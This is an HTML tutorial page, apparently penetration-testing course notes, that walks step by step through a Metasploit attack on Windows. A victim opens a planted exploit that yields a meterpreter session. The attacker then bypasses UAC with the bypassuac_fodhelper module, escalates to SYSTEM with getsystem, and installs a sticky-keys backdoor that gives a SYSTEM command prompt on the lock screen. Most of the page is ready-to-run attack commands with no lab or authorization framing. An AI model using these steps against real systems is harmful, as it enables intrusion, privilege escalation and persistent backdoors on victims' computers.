  <h2>Remote Shell Workflow</h2>
<p>Follow the <a href=remote_shell_workflow1.html><b>remote shell workflow</b></a> to create an exploit and store it in /var/www/html/share</p>
<p>As soon as the victim downloads and opens the exploit, a meterpreter session will open</p>
<p><ol>
  <ul>sysinfo</ul>
  <ul>getuid</ul>
  <ul>background</ul>
</ol>
<p>Note: to return to the active session when it is running in background is:</p>
<p><ol>
 <ul>sessions -i* -> show active background sessions</ul>
 <ul>sessions -i 1 -> return to the first background session</ul>
</ol>
<p>The meterpreter session is running on the background. Now, type <b>search bypassuac</b> to get the list of bypassuac modules. We wil bypass Windows UAC 
  protection via the FodHelper Registry Key, which is present in Metasploit as <b>bypassuac_fodhelper</b> exploit.</p>
<p>This module will bypass Windows 10 UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get 
 invoked when the Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC flag turned off. This module modifies a registry key, 
 but cleans up the key once the payload has been invoked. The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom 
 your DLL should call ExitProcess() after starting your payload in a separate process.</p>
<p><ol>
  <ul>use exploit/windows/local/bypassuac_fodhelper</ul>
  <ul>set session 1</ul>
  <ul>show options</ul>
 <ul>set lhost 10.10.1.13</ul>
 <ul>set target 0</ul>
 <ul>exploit</ul>
</ol></p>
<p>The BypassUAC exploit will bypass the UAC setting on the Windows machine.</p>
<p><ol>
  <ul>getsystem -t 1</ul>
  <ul>getuid -> the meterpreter session is now running with system privileges</ul>
  <ul>background</ul>
</ol></p>
<p>The procedure above will NOT always work, depending of the fact if the OS on the target system is vulnerable or not. Some versions of Windows with some versions 
of patches and service packs are simply NOT vulnerable and the procedure will fail. If the elevation process fails, try if you can use SHELL etc. anyway.</p>
<h2>Sticky Keys</h2>
<p>We will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows.</p>
<p><ol>
  <ul>use post/windows/manage/sticky_keys</ul>
  <ul>sessions -i*</ul>
  <ul>set session 2 -> set the privileged session as the current version</ul>
  <ul>exploit</ul>
</ol>
<p>When a Windows computer is locked, press Shift key 5 times, which will open a command prompt on the lock screen with system privileges</p>
<h2>Running a shell</h2>
<p>You can run a shell on the remote computer in a session (NOT a background session):</p>
<p><ol>
 <ul>meterpreter > shell</ul>
 <ul>exit</ul>
 <ul>background -> now you can run Metasploit actions again</ul>
</ol></p>
